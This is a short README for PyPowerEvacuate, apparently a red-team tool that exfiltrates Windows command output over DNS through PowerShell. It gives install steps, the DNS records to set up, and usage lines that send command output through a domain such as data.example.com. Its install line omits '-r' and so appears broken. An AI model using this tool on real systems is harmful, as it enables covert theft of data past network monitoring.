# PyPowerEvacuate

PyPowerEvacuate is a tool that allows you to exfiltrate command output over DNS on Windows machines by PowerShell.

![](https://raw.githubusercontent.com/0xAbdullah/PyPowerEvacuate/main/Screenshot.gif)

# Installation
```
git clone https://github.com/0xAbdullah/PyPowerEvacuate.git
cd PyPowerEvacuate
pip3 install requirements.txt
```

# Requirements

If you want to use your domain.
```
Set A record to your public IP. -Pointe to your IP/Server-
Set NS record to any subdomain. -Example: data.example.com-
```

# Usage
```
python3 PyPowerEvacuate.py -c COMMAND
python3 PyPowerEvacuate.py -c COMMAND -d data.example.com
```
